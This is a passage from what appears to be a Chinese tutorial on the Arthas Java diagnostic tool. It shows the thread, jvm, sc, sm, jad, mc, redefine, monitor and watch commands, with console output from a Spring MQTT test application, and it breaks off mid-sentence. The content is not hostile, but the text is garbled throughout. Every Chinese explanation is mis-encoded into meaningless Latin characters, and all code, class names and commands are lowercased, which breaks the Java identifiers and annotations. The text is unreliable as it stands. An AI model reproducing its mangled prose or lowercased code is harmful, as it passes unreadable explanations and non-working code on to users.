ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\nç¤ºä¾ï¼thread æåºææè¿è¡çº¿ç¨\n\n$ thread\nthreads total: 37, new: 0, runnable: 14, blocked: 0, waiting: 17, timed_waiting: 6, terminated: 0                                                                                                                                       \nid                 name                                                      group                                  priority           state               %cpu               time               interrupted         daemon             \n59                 as-command-execute-daemon                                 system                                 10                 runnable            100                0:0                false               true               \n42                 asyncappender-worker-arthas-cache.result.asyncappender    system                                 9                  waiting             0                  0:0                false               true               \n40                 attach listener                                           system                                 9                  runnable            0                  0:0                false               true               \n14                 catalina-utility-1                                        main                                   1                  waiting             0                  0:1                false               false              \n15                 catalina-utility-2                                        main                                   1                  timed_waiting       0                  0:0                false               false              \n10                 common-cleaner                                            innocuousthreadgroup                   8                  timed_waiting       0                  0:0                false               true               \n39                 destroyjavavm                                             main                                   5                  runnable            0                  0:12               false               false              \n3                  finalizer                                                 system                                 8                  waiting             0                  0:0                false               true               \n19                 mqtt call: mqttid_inbound                                 main                                   5                  waiting             0                  0:0                false               false              \n23                 mqtt ping: mqttid_inbound                                 main                                   5                  timed_waiting       0                  0:0                false               false              \n20                 mqtt rec: mqttid_inbound                                  main                                   5                  runnable            0                  0:0                false               false              \n21                 mqtt snd: mqttid_inbound                                  main                                   5                  waiting             0                  0:0                false               false              \n24                 nioblockingselector.blockpoller-1                         main                                   5                  runnable            0                  0:0                false               true               \n2                  reference handler                                         system                                 10                 runnable            0                  0:0                false               true               \n4                  signal dispatcher                                         system                                 9                  runnable            0                  0:0                false               true               \n16                 container-0                                               main                                   5                  timed_waiting       0                  0:0                false               false              \n37                 http-nio-8087-acceptor-0                                  main                                   5                  runnable            0                  0:0                false               true               \n35                 http-nio-8087-clientpoller-0                              main                                   5                  runnable            0                  0:0                false               true               \n36                 http-nio-8087-clientpoller-1                              main                                   5                  runnable            0                  0:0                false               true               \n25                 http-nio-8087-exec-1                                      main                                   5                  waiting             0                  0:0                false               true               \n34                 http-nio-8087-exec-10                                     main                                   5                  waiting             0                  0:0                false               true               \n26                 http-nio-8087-exec-2                                      main                                   5                  waiting             0                  0:0                false               true               \n27                 http-nio-8087-exec-3                                      main                                   5                  waiting             0                  0:0                false               true               \n28                 http-nio-8087-exec-4                                      main                                   5                  waiting             0                  0:0                false               true               \n29                 http-nio-8087-exec-5                                      main                                   5                  waiting             0                  0:0                false               true               \n30                 http-nio-8087-exec-6                                      main                                   5                  waiting             0                  0:0                false               true               \n31                 http-nio-8087-exec-7                                      main                                   5                  waiting             0                  0:0                false               true               \n32                 http-nio-8087-exec-8                                      main                                   5                  waiting             0                  0:0                false               true               \n33                 http-nio-8087-exec-9                                      main                                   5                  waiting             0                  0:0                false               true               \n44                 job-timeout                                               system                                 9                  timed_waiting       0                  0:0                false               true               \n45                 nioeventloopgroup-2-1                                     system                                 10                 runnable            0                  0:0                false               false              \n49                 nioeventloopgroup-2-2                                     system                                 10                 runnable            0                  0:1                false               false              \n53                 nioeventloopgroup-2-3                                     system                                 10                 runnable            0                  0:0                false               false              \n46                 nioeventloopgroup-3-1                                     system                                 10                 runnable            0                  0:0                false               false              \n22                 pool-2-thread-4                                           main                                   5                  waiting             0                  0:0                false               false              \n47                 pool-3-thread-1                                           system                                 5                  timed_waiting       0                  0:0                false               false              \n48                 pool-4-thread-1                                           system                                 5                  waiting             0                  0:0                false               false              \naffect(row-cnt:0) cost in 113 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\nç¤ºä¾ï¼thread 20 æ¥ççº¿ç¨ id ä¸º 20 çå æ ä¿¡æ¯\n\n$ thread 20\n"mqtt rec: mqttid_inbound" id=20 runnable (in native)\n    at java.base@12.0.1/java.net.socketinputstream.socketread0(native method)\n    at java.base@12.0.1/java.net.socketinputstream.socketread(socketinputstream.java:115)\n    at java.base@12.0.1/java.net.socketinputstream.read(socketinputstream.java:168)\n    at java.base@12.0.1/java.net.socketinputstream.read(socketinputstream.java:140)\n    at java.base@12.0.1/java.net.socketinputstream.read(socketinputstream.java:200)\n    at java.base@12.0.1/java.io.datainputstream.readbyte(datainputstream.java:270)\n    at org.eclipse.paho.client.mqttv3.internal.wire.mqttinputstream.readmqttwiremessage(mqttinputstream.java:92)\n    at org.eclipse.paho.client.mqttv3.internal.commsreceiver.run(commsreceiver.java:133)\n    at java.base@12.0.1/java.util.concurrent.executors$runnableadapter.call(executors.java:515)\n    at java.base@12.0.1/java.util.concurrent.futuretask.run(futuretask.java:264)\n    at java.base@12.0.1/java.util.concurrent.scheduledthreadpoolexecutor$scheduledfuturetask.run(scheduledthreadpoolexecutor.java:304)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1128)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:628)\n    at java.base@12.0.1/java.lang.thread.run(thread.java:835)\n\n    number of locked synchronizers = 1\n    - java.util.concurrent.threadpoolexecutor$worker@79cf8c25\n\naffect(row-cnt:0) cost in 33 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n\n\nç¤ºä¾ï¼thread -b æ¾åºé»å¡å¶ä»çº¿ç¨ççº¿ç¨\n\n$ thread -b\nno most blocking thread found!\naffect(row-cnt:0) cost in 43 ms.\n\n\n1\n2\n3\n\n\nç¤ºä¾ï¼thread -n 3 -i 5000 é»å¡æå® 5 ç§åæ¶å°å 3 çº¿ç¨çå æ ä¿¡æ¯\n\n$ thread -n 3  -i 5000\n"catalina-utility-1" id=14 cpuusage=21% timed_waiting on java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject@72b49c8\n    at java.base@12.0.1/jdk.internal.misc.unsafe.park(native method)\n    -  waiting on java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject@72b49c8\n    at java.base@12.0.1/java.util.concurrent.locks.locksupport.parknanos(locksupport.java:235)\n    at java.base@12.0.1/java.util.concurrent.locks.abstractqueuedsynchronizer$conditionobject.awaitnanos(abstractqueuedsynchronizer.java:2123)\n    at java.base@12.0.1/java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:1182)\n    at java.base@12.0.1/java.util.concurrent.scheduledthreadpoolexecutor$delayedworkqueue.take(scheduledthreadpoolexecutor.java:899)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor.gettask(threadpoolexecutor.java:1054)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1114)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:628)\n    at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61)\n    at java.base@12.0.1/java.lang.thread.run(thread.java:835)\n\n\n"http-nio-8087-clientpoller-1" id=36 cpuusage=14% runnable (in native)\n    at java.base@12.0.1/sun.nio.ch.epoll.wait(native method)\n    at java.base@12.0.1/sun.nio.ch.epollselectorimpl.doselect(epollselectorimpl.java:120)\n    at java.base@12.0.1/sun.nio.ch.selectorimpl.lockanddoselect(selectorimpl.java:124)\n    -  locked sun.nio.ch.util$2@703ba4c0\n    -  locked sun.nio.ch.epollselectorimpl@6a6a92bd\n    at java.base@12.0.1/sun.nio.ch.selectorimpl.select(selectorimpl.java:136)\n    at org.apache.tomcat.util.net.nioendpoint$poller.run(nioendpoint.java:743)\n    at java.base@12.0.1/java.lang.thread.run(thread.java:835)\n\n\n"as-command-execute-daemon" id=62 cpuusage=10% runnable\n    at java.management@12.0.1/sun.management.threadimpl.dumpthreads0(native method)\n    at java.management@12.0.1/sun.management.threadimpl.getthreadinfo(threadimpl.java:466)\n    at com.taobao.arthas.core.command.monitor200.threadcommand.processtopbusythreads(threadcommand.java:133)\n    at com.taobao.arthas.core.command.monitor200.threadcommand.process(threadcommand.java:79)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl.process(annotatedcommandimpl.java:82)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl.access$100(annotatedcommandimpl.java:18)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl$processhandler.handle(annotatedcommandimpl.java:111)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl$processhandler.handle(annotatedcommandimpl.java:108)\n    at com.taobao.arthas.core.shell.system.impl.processimpl$commandprocesstask.run(processimpl.java:370)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1128)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:628)\n    at java.base@12.0.1/java.lang.thread.run(thread.java:835)\n\n    number of locked synchronizers = 1\n    - java.util.concurrent.threadpoolexecutor$worker@2d2909be\n\n\naffect(row-cnt:0) cost in 5045 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n\n\n\n# jvm\n\næ¥çå½å jvm ä¿¡æ¯ï¼è¿éåªæ¿é¨åä¿¡æ¯æ¥è¯´\n\n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n thread                                                                                                                                                                                                                                 \n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n count                                                             37                                                                                                                                                                   \n daemon-count                                                      22                                                                                                                                                                   \n peak-count                                                        38                                                                                                                                                                   \n started-count                                                     55                                                                                                                                                                   \n deadlock-count                                                    0                                                                                                                                                                    \n                                                                                                                                                                                                                                        \n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n file-descriptor                                                                                                                                                                                                                        \n----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------\n max-file-descriptor-count                                         -1                                                                                                                                                                   \n open-file-descriptor-count                                        -1         \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nthread ç¸å³\n\n * count: jvm å½åæ´»è·ççº¿ç¨æ°\n * daemon-count: jvm å½åæ´»è·çå®æ¤çº¿ç¨æ°\n * peak-count: ä» jvm å¯å¨å¼å§æ¾ç»æ´»ççæå¤§çº¿ç¨æ°\n * started-count: ä» jvm å¯å¨å¼å§æ»å±å¯å¨è¿ççº¿ç¨æ¬¡æ°\n * deadlock-count: jvm å½åæ­»éççº¿ç¨æ°\n\nfile-descriptor ç¸å³\n\n * max-file-descriptor-countï¼jvm è¿ç¨æå¤§å¯ä»¥æå¼çæä»¶æè¿°ç¬¦æ°\n * open-file-descriptor-countï¼jvm å½åæå¼çæä»¶æè¿°ç¬¦æ°\n\n\n# sc\n\næ¥ç jvm å·²å è½½çç±»ä¿¡æ¯ï¼\nåæ°è¯´æï¼lassï¼åå + ç±»åï¼ï¼methodï¼æ¹æ³åï¼ï¼[d]ï¼è¾åºè¯¦ç»ä¿¡æ¯ï¼ï¼[e]ï¼å¼å¯æ­£åè¡¨è¾¾å¼å¹éï¼é»è®¤ä¸ºééç¬¦å¹éï¼ï¼[f]ï¼è¾åºå½åç±»çæååéä¿¡æ¯ï¼éè¦éååæ° - d ä¸èµ·ä½¿ç¨ï¼ï¼ï¼[x:]ï¼æå®è¾åºéæåéæ¶å±æ§çéåæ·±åº¦ï¼é»è®¤ä¸º 0ï¼å³ç´æ¥ä½¿ç¨ tostring è¾åºï¼\nclass-pattern æ¯æå¨éå®åï¼å¦ com.taobao.test.aaaï¼ä¹æ¯æ com/taobao/test/aaa è¿æ ·çæ ¼å¼ï¼è¿æ ·ï¼æä»¬ä»å¼å¸¸å æ éé¢æç±»åæ·è´è¿æ¥çæ¶åï¼ä¸éè¦å¨æå¨æ / æ¿æ¢ä¸ºãå¦ã\nç¤ºä¾ï¼sc com.cloud*\n\n$ sc com.cloud*\ncom.cloud.mqtt.mqttapplication\ncom.cloud.mqtt.mqttapplication$$enhancerbyspringcglib$$b4fbeb8a\ncom.cloud.mqtt.mqtt.mqttconfig\ncom.cloud.mqtt.mqtt.mqttconfig$$enhancerbyspringcglib$$d1953d4e\ncom.cloud.mqtt.mqtt.mqttconfig$$enhancerbyspringcglib$$d1953d4e$$fastclassbyspringcglib$$69e081d8\ncom.cloud.mqtt.mqtt.mqttconfig$$fastclassbyspringcglib$$bf72748c\ncom.cloud.mqtt.mqtt.mqttconfig$1\ncom.cloud.mqtt.mqtt.mqttreceiveconfig\ncom.cloud.mqtt.mqtt.mqttreceiveconfig$$enhancerbyspringcglib$$5631a71d\ncom.cloud.mqtt.mqtt.mqttsenderconfig\ncom.cloud.mqtt.mqtt.mqttsenderconfig$$enhancerbyspringcglib$$3bfb2a03\ncom.cloud.mqtt.mqtt.publisher\ncom.cloud.mqtt.web.mqttgateway\ncom.cloud.mqtt.web.testcontroller\ncom.sun.proxy.$proxy65\naffect(row-cnt:15) cost in 20 ms.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nç¤ºä¾ï¼sc -d -f com.cloud.mqtt.web.testcontroller æå°ç±»çä¿¡æ¯ä»¥åå­æ®µçä¿¡æ¯\n\n$ sc -d -f com.cloud.mqtt.web.testcontroller\n class-info        com.cloud.mqtt.web.testcontroller                                                                                                                                                                                    \n code-source       file:/home/fengqianrun/opt/server/mqtt-0.0.1.jar!/boot-inf/classes!/                                                                                                                                                 \n name              com.cloud.mqtt.web.testcontroller                                                                                                                                                                                    \n isinterface       false                                                                                                                                                                                                                \n isannotation      false                                                                                                                                                                                                                \n isenum            false                                                                                                                                                                                                                \n isanonymousclass  false                                                                                                                                                                                                                \n isarray           false                                                                                                                                                                                                                \n islocalclass      false                                                                                                                                                                                                                \n ismemberclass     false                                                                                                                                                                                                                \n isprimitive       false                                                                                                                                                                                                                \n issynthetic       false                                                                                                                                                                                                                \n simple-name       testcontroller                                                                                                                                                                                                       \n modifier          public                                                                                                                                                                                                               \n annotation        org.springframework.web.bind.annotation.restcontroller,org.springframework.web.bind.annotation.requestmapping                                                                                                        \n interfaces                                                                                                                                                                                                                             \n super-class       +-java.lang.object                                                                                                                                                                                                   \n class-loader      +-org.springframework.boot.loader.launchedurlclassloader@439f5b3d                                                                                                                                                    \n                     +-jdk.internal.loader.classloaders$appclassloader@5bc2b487                                                                                                                                                         \n                       +-jdk.internal.loader.classloaders$platformclassloader@75d2da2d                                                                                                                                                  \n classloaderhash   439f5b3d                                                                                                                                                                                                             \n fields            modifier  private                                                                                                                                                                                                    \n                   type      com.cloud.mqtt.web.mqttgateway                                                                                                                                                                                                      \n                   name      mqttgateway                                                                                                                                                                                                \n                   annotationjavax.annotation.resource                                                                                                                                                                                  \n                                                                                                                                                                                                                                        \n\naffect(row-cnt:1) cost in 15 ms.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# sm\n\næ¥çå·²å è½½ç±»çæ¹æ³ä¿¡æ¯ï¼å½ä»¤åªè½çå°ç±å½åç±»æå£°æ (declaring) çæ¹æ³ï¼ç¶ç±»åæ æ³çå°ã\nåæ°è¯´æï¼classï¼åå + ç±»åï¼ï¼methodï¼æ¹æ³åç§°ï¼ï¼[d]ï¼å±ç¤ºæ¯ä¸ªæ¹æ³çè¯¦ç»ä¿¡æ¯ï¼ï¼[e]ï¼å¼å¯æ­£åè¡¨è¾¾å¼å¹éï¼é»è®¤ä¸ºééç¬¦å¹éï¼\nç¤ºä¾ï¼sm com.cloud.mqtt.web.testcontroller æ¥è¯¢ testcontroller ä¸çæææ¹æ³\n\n$ sm  com.cloud.mqtt.web.testcontroller\ncom.cloud.mqtt.web.testcontroller <init>()v\ncom.cloud.mqtt.web.testcontroller test(ljava/lang/string;ljava/lang/string;)ljava/lang/string;\ncom.cloud.mqtt.web.testcontroller sendmqtt(ljava/lang/string;ljava/lang/string;)ljava/lang/string;\ncom.cloud.mqtt.web.testcontroller sendtest(ljava/lang/string;ljava/lang/string;)ljava/lang/string;\naffect(row-cnt:4) cost in 12 ms.\n\n\n1\n2\n3\n4\n5\n6\n\n\nç¤ºä¾ï¼sm -d com.cloud.mqtt.web.testcontroller test æ¥è¯¢ testcontroller ä¸ç test æ¹æ³è¯¦æ\n\n$ sm -d com.cloud.mqtt.web.testcontroller test\n declaring-class  com.cloud.mqtt.web.testcontroller                                                                                                                                                                                     \n method-name      test                                                                                                                                                                                                                  \n modifier         public                                                                                                                                                                                                                \n annotation       org.springframework.web.bind.annotation.getmapping                                                                                                                                                                    \n parameters       java.lang.string                                                                                                                                                                                                      \n                  java.lang.string                                                                                                                                                                                                      \n return           java.lang.string                                                                                                                                                                                                      \n exceptions                                                                                                                                                                                                                             \n\naffect(row-cnt:1) cost in 13 ms.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# jad\n\njad åç¼è¯æå®å·²å è½½ç±»å¾æºç ï¼jad å¨ arthas console ä¸ï¼åç¼è¯åºæ¥å¾æºç æ¯å¸¦è¯­æ³é«äº®å¾ï¼éè¯»æ¹ä¾¿ï¼å½ç¶åç¼è¯åºæ¥å¾ java ä»£ç å¯è½ä¼å­å¨è¯­æ³éè¯¯ï¼ä½ä¸å½±åä½ çè¿è¡éè¯»ã\nåæ°è¯´æï¼classï¼åå + ç±»åï¼ï¼[c:]ï¼ç±»æå± classloader å¾ hashcodeï¼ï¼[e]ï¼å¼å¯æ­£åè¡¨è¾¾å¹éï¼é»è®¤ééç¬¦ï¼\nç¤ºä¾ï¼åç¼è¯ com.cloud.mqtt.web.testcontroller\n\n$ jad com.cloud.mqtt.web.testcontroller\n\nclassloader:                                                                                                                                                                                                                            \n+-org.springframework.boot.loader.launchedurlclassloader@439f5b3d                                                                                                                                                                       \n  +-jdk.internal.loader.classloaders$appclassloader@5bc2b487                                                                                                                                                                            \n    +-jdk.internal.loader.classloaders$platformclassloader@75d2da2d                                                                                                                                                                     \n\nlocation:                                                                                                                                                                                                                               \nfile:/home/fengqianrun/opt/server/mqtt-0.0.1.jar!/boot-inf/classes!/                                                                                                                                                                    \n\n/*\n * decompiled with cfr 0_132.\n * \n * could not load the following classes:\n *  com.cloud.mqtt.web.mqttgateway\n *  javax.annotation.resource\n *  org.springframework.web.bind.annotation.getmapping\n *  org.springframework.web.bind.annotation.requestmapping\n *  org.springframework.web.bind.annotation.requestparam\n *  org.springframework.web.bind.annotation.restcontroller\n */\npackage com.cloud.mqtt.web;\n\nimport com.cloud.mqtt.web.mqttgateway;\nimport javax.annotation.resource;\nimport org.springframework.web.bind.annotation.getmapping;\nimport org.springframework.web.bind.annotation.requestmapping;\nimport org.springframework.web.bind.annotation.requestparam;\nimport org.springframework.web.bind.annotation.restcontroller;\n\n@restcontroller\n@requestmapping(value={"/test"})\npublic class testcontroller {\n    @resource\n    private mqttgateway mqttgateway;\n\n    @getmapping(value={"/"})\n    public string test(string a, string b) {\n        string rt = a + b;\n        return rt;\n    }\n\n    @getmapping(value={"/send"})\n    public string sendmqtt(@requestparam(value="data") string data, @requestparam(value="topic") string topic) {\n        string rt = "sendmqtt";\n        return rt;\n    }\n\n    @getmapping(value={"/sendtest"})\n    public string sendtest(@requestparam(value="data") string data, @requestparam(value="topic") string topic) {\n        string rt = "sendmqtt";\n        return "ok";\n    }\n}\n\naffect(row-cnt:1) cost in 394 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\nç¤ºä¾ï¼åç¼è¯ com.cloud.mqtt.web.testcontroller test æ¹æ³\n\n$ jad com.cloud.mqtt.web.testcontroller test\n\nclassloader:                                                                                                                                                                                                                            \n+-org.springframework.boot.loader.launchedurlclassloader@439f5b3d                                                                                                                                                                       \n  +-jdk.internal.loader.classloaders$appclassloader@5bc2b487                                                                                                                                                                            \n    +-jdk.internal.loader.classloaders$platformclassloader@75d2da2d                                                                                                                                                                     \n\nlocation:                                                                                                                                                                                                                               \nfile:/home/fengqianrun/opt/server/mqtt-0.0.1.jar!/boot-inf/classes!/                                                                                                                                                                    \n\n@getmapping(value={"/"})\npublic string test(string a, string b) {\n    string rt = a + b;\n    return rt;\n}\n\naffect(row-cnt:1) cost in 67 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# mc\n\nåå­ç¼è¯å¨ï¼ç¼è¯.java æä»¶çæ.class æä»¶ãç¼è¯çæ.class ä¹åä»¬ï¼å¯ä»¥èå redefine å½ä»¤å®ç°ç­æ´æ°ä»£ç ã\nåæ°è¯´æï¼[c:]ï¼æå® classloaderï¼ï¼[d]ï¼æå®è¾åºç®å½ï¼\n\nmc /tmp/test.java ç¼è¯test.javaæä»¶\nmc -c 327a647b /tmp/test.java æå®classloaderç¼è¯\nmc -d /tmp/output /tmp/classa.java /tmp/classb.java ç¼è¯å°æå®ç®å½\n\n\n1\n2\n3\n\n\n\n# redefine\n\nå è½½å¤é¨ç .class æä»¶å° redefine jvm å·²å è½½çç±»ã\nredefine åçåæ¥çç±»ä¸è½æ¢å¤ï¼redefine æå¯è½å¤±è´¥ï¼æ¯å¦å¢å äºæ°ç fieldï¼ï¼åè jdk æ¬èº«çææ¡£ã\nåæ°è¯´æï¼[c:]ï¼classloader ç hashcodeï¼ï¼[p:]ï¼å¤é¨ç.class æä»¶çå®æ´è·¯å¾ï¼æ¯æå¤ä¸ªï¼\n\nredefine /tmp/test.class\nç»å jad/mc å½ä»¤ä½¿ç¨ï¼\njad --source-only com.example.demo.arthas.user.usercontroller > /tmp/usercontroller.java\nmc /tmp/usercontroller.java -d /tmp\nredefine /tmp/com/example/demo/arthas/user/usercontroller.class\n- jadå½ä»¤åç¼è¯ï¼ç¶åå¯ä»¥ç¨å¶å®ç¼è¯å¨ï¼æ¯å¦vimæ¥ä¿®æ¹æºç \n- mcå½ä»¤æ¥åå­ç¼è¯ä¿®æ¹è¿çä»£ç \n- ç¨redefineå½ä»¤å è½½æ°çå­èç \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nredefine çéå¶ï¼ä¸åè®¸æ°å¢å  field/methodï¼æ­£å¨è·çå½æ°ï¼æ²¡æéåºä¸è½çæï¼æ¯å¦ä¸é¢æ°å¢å ç system.out.printlnï¼åªæ run () å½æ°éçä¼çæã\n\n\n# monitor\n\nmonitor æ¹æ³çæ§æ§è¡ï¼æ¯ä¸ä¸ªéå®æ¶å¾è¿åå½ä»¤ï¼ææå°±æ¯å¯ä»¥ä¸ç´çæ§æä¸ä¸ªæ¹æ³ï¼ç´å°ä½ æ ctrl+c ç»æä¸ºæ­¢ã\nçæ§å¾ä¿¡æ¯åæ¬ï¼timestamp (æ¶é´æ³)ï¼classï¼java ç±»ï¼ï¼methodï¼æ¹æ³ï¼åæ¬æé æ¹æ³åæ®éæ¹æ³ï¼ï¼totalï¼è°ç¨æ¬¡æ°ï¼ï¼successï¼æåæ¬¡æ°ï¼ï¼failï¼å¤±è´¥æ¬¡æ°ï¼ï¼rtï¼å¹³å rtï¼ï¼fail-rateï¼å¤±è´¥çï¼ã\næ¹æ³åæ°è¯´æï¼classï¼åå + ç±»åï¼ï¼methodï¼æ¹æ³åï¼ï¼[e]ï¼å¼å¯æ­£åè¡¨è¾¾å¹éï¼é»è®¤ééç¬¦ï¼ï¼[c:]ï¼å¾å°è¿è¡æ¥åå¾é´éæ¶é´ï¼é»è®¤æ¯ 120 ç§ï¼\n\n$ monitor -c 5 com.cloud.mqtt.web.testcontroller test\npress q or ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 60 ms.\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:03  com.cloud.mqtt.web.testcontroller  test    6      6        0     0.34        0.00%                                                                                                                                \n\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:08  com.cloud.mqtt.web.testcontroller  test    1      1        0     0.09        0.00%                                                                                                                                \n\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:13  com.cloud.mqtt.web.testcontroller  test    0      0        0     0.00        0.00%                                                                                                                                \n\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:18  com.cloud.mqtt.web.testcontroller  test    0      0        0     0.00        0.00%            \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\næå¾ç±» com.cloud.mqtt.web.testcontroller ï¼æ¹æ³ä¸º test ï¼-c 5 å¾ææå°±æ¯æ¯ 5 ç§æå°ä¸æ¬¡ã\n\n\n# watch\n\nwatch æ¹æ³æ§è¡æ°æ®è§æµã\nåæ°è¯´æï¼classï¼ç±»åè¡¨è¾¾å¼å¹éï¼ï¼methodï¼æ¹æ³åè¡¨è¾¾å¼å¹éï¼ï¼expressï¼è§å¯è¡¨è¾¾å¼ï¼ï¼condition-expressï¼æ¡ä»¶è¡¨è¾¾å¼ï¼ï¼[b]ï¼å¨æ¹æ³è°ç¨ä¹åè§å¯ï¼ï¼[e]ï¼å¨æ¹æ³å¼å¸¸ä¹åè§å¯ï¼ï¼[s]ï¼å¨æ¹æ³è¿åä¹åè§å¯ï¼ï¼[f]ï¼å¨æ¹æ³ç»æä¹å (æ­£å¸¸è¿ååå¼å¸¸è¿å) è§å¯ï¼ï¼[e]ï¼å¼å¯æ­£åè¡¨è¾¾å¼å¹éï¼é»è®¤ä¸ºééç¬¦å¹éï¼ï¼[x:]ï¼æå®è¾åºç»æçå±æ§éåæ·±åº¦ï¼é»è®¤ä¸º 1ï¼\nç¹å«è¯´æï¼\n\n * watch å½ä»¤å®ä¹äº 4 ä¸ªè§å¯äºä»¶ç¹ï¼å³ -b æ¹æ³è°ç¨åï¼-e æ¹æ³å¼å¸¸åï¼-s æ¹æ³è¿ååï¼-f æ¹æ³ç»æå\n * 4 ä¸ªè§å¯äºä»¶ç¹ -bã-eã-s é»è®¤å³é­ï¼-f é»è®¤æå¼ï¼å½æå®è§å¯ç¹è¢«æå¼åï¼å¨ç¸åºäºä»¶ç¹ä¼å¯¹è§å¯è¡¨è¾¾å¼è¿è¡æ±å¼å¹¶è¾åº\n * è¿éè¦æ³¨ææ¹æ³å¥ååæ¹æ³åºåçåºå«ï¼æå¯è½å¨ä¸­é´è¢«ä¿®æ¹å¯¼è´ååä¸ä¸è´ï¼é¤äº -b äºä»¶ç¹ params ä»£è¡¨æ¹æ³å¥åå¤ï¼å¶ä½äºä»¶é½ä»£è¡¨æ¹æ³åºå\n * å½ä½¿ç¨ -b æ¶ï¼ç±äºè§å¯äºä»¶ç¹æ¯å¨æ¹æ³è°ç¨åï¼æ­¤æ¶è¿åå¼æå¼å¸¸åä¸å­å¨\n\ncurl "http://192.168.15.130:8087/test/?a=1&b=3" ï¼-x 2çæææ¯ï¼æ¯å¦æ·±åº¦è§£æåæ°ï¼å¦æä½ çåæ°æ¯ä¸ä¸ªå¯¹è±¡ï¼ä¸æ·±åº¦è§£æï¼ä½ çå°çåªæ¯å¯¹è±¡å°åï¼æ·±åº¦è§£æçå¼ï¼è·ä½ åæ°æåµå¥å±æ°æå³ã\n$ watch com.cloud.mqtt.web.testcontroller  test "{params,returnobj}" -x 2\npress q or ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 41 ms.\nts=2019-08-19 17:02:09; [cost=0.241819ms] result=@arraylist[\n    @object[][\n        @string[1],\n        @string[3],\n    ],\n    @string[13],\n]\n\n-b æææ¯è§£æå¥åï¼-sè§£æåºåï¼ -n 2æ§è¡ä¸¤æ¬¡çææï¼2æ¬¡å®åç»æãç»æçè¾åºé¡ºåºåäºä»¶åççååé¡ºåºä¸è´ï¼åå½ä»¤ä¸­ -s -b çé¡ºåºæ å³ã\n$ watch com.cloud.mqtt.web.testcontroller  test "{params,returnobj}" -x 2 -b  -s -n 2\npress q or ctrl+c to abort.\naffect(class-cnt:1 , method-cnt:1) cost in 46 ms.\nts=2019-08-19 17:06:21; [cost=0.006941ms] result=@arraylist[\n    @object[][\n        @string[1],\n        @string[3],\n    ],\n    null,\n]\nts=2019-08-19 17:06:21; [cost=0.945661ms] result=@arraylist[\n    @object[][\n        @string[1],\n        @string[3],\n    ],\n    @string[13],\n]\ncommand execution times exceed limit: 2, so command will exit. you can set it with -n option.\n\næ¡ä»¶è¡¨è¾¾å¼ï¼ç¬¬ä¸ä¸ªä¼ 